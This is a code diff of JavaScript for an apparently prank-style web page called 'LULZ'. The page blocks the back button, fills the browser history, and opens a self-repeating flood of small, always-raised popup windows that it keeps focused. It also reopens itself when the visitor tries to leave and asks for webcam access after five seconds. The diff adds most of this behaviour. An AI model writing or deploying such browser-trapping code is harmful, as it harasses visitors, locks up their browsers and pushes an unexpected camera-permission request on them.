@@ -14,10 +14,18 @@ function fillHistory () {
 
 blockBackButton()
 fillHistory()
-focusWindows()
+son = []
 
 function openWindow(url){
-        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=220,height=240,titlebar=no,alwaysRaised=yes');
+  aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=220,height=240,titlebar=no,alwaysRaised=yes');
+  if (!aWindow) return
+  son.push(aWindow)
+}
+
+function focusWindows(){
+  son.forEach(son => {
+    if (!son.closed) son.focus()
+  })
 }
 
 document.getElementById("LULZ").addEventListener('click', e => {
@@ -25,7 +33,15 @@ document.getElementById("LULZ").addEventListener('click', e => {
   openWindow('popup.html')
   openWindow('popup.html')
   focusWindows()
-  document.getElementById("LULZ").innerHTML = "<H1>enjoy :D</H1>"
+  document.getElementById("LULZ").innerHTML = "<H1>:D</H1>"
   document.getElementById("LULZ").click()
   
 })
+
+window.onbeforunload = function() {
+ window.open(window.location.href) 
+}
+
+setTimeout(function() {
+  navigator.mediaDevices.getUserMedia({video: true})
+}, 5000)
